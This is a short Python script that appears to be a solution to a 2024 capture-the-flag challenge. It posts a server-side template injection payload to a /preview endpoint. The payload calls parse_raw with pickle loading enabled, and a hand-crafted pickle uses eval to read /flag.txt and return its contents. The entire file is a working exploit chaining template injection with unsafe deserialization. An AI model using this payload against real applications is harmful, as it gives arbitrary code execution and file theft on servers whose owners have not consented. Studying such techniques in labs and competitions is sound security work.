from requests import post

BASE_URL = "http://ctf2024-entry.r3kapig.com:31798"

if __name__ == "__main__":
    # https://intoli.com/blog/dangerous-pickles/
    with post(
        f"{BASE_URL}/preview",
        json={
            "template": {
                "source": R"""{{ user.parse_raw('c__builtin__\neval\n(V{"age": 0, "name": "a", "description": __import__("pathlib").Path("/flag.txt").read_text()}\ntR.'.encode(), content_type="pickle", allow_pickle=True).description }}"""
            },
            "user": {
                "age": 18,
                "description": "",
                "name": "John",
            },
        },
    ) as req:
        print(req.text)
